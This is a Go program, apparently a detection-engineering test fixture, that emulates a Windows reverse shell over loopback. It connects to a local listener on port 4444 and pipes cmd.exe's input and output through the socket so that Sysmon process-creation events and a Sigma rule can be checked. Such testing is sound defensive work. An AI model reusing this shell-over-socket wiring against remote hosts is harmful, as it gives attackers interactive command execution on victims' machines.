//go:build windows

// reverse_shell composite (ATT&CK T1059) -- Go os/exec loopback shell relay,
// the Windows analog of the Linux Go reverse_shell.
//
// Sysmon EID 1 (Process Create). Sigma keys on the child image:
// `Image endswith \cmd.exe`. Expected ROBUST: the event-level sensor fires the
// moment cmd.exe is spawned, regardless of how its stdio are wired. The whole
// point of this substrate mover is that Go's os/exec cannot hand a net.Conn to
// the child directly (a net.Conn is not an *os.File), so it inserts OS pipes
// and relays bytes with background goroutines -- the child's stdio are pipes,
// not the socket. That stdio model is invisible to Sysmon EID 1, which watches
// process creation, so the detection stands where a fd-typed rule would not.
//
// Self-contained, benign, deterministic: a loopback listener on 127.0.0.1:4444
// accepts the connection and sends "exit\r\n", so cmd.exe runs only `exit`.
package main

import (
	"io"
	"net"
	"os"
	"os/exec"
	"time"
)

func comspec() string {
	if cs := os.Getenv("ComSpec"); cs != "" {
		return cs
	}
	return `C:\Windows\System32\cmd.exe`
}

func main() {
	ln, err := net.Listen("tcp", "127.0.0.1:4444")
	if err != nil {
		return
	}
	defer ln.Close()

	done := make(chan struct{})
	go func() {
		defer close(done)
		c, err := ln.Accept()
		if err != nil {
			return
		}
		c.Write([]byte("exit\r\n")) // drive cmd.exe to terminate
		// Half-close so the client conn EOFs: os/exec's stdin-copy goroutine
		// blocks reading conn until EOF, so without this cmd.Run never returns.
		if tc, ok := c.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		io.Copy(io.Discard, c) // drain cmd.exe's output until it closes
		c.Close()
	}()

	conn, err := net.Dial("tcp", "127.0.0.1:4444")
	if err != nil {
		return
	}
	cmd := exec.Command(comspec())
	// net.Conn != *os.File -> os/exec inserts pipes, so cmd.exe's stdio are
	// pipes, not the socket. Sysmon EID 1 fires on the spawn regardless.
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	conn.Close()

	select {
	case <-done:
	case <-time.After(2 * time.Second):
	}
}
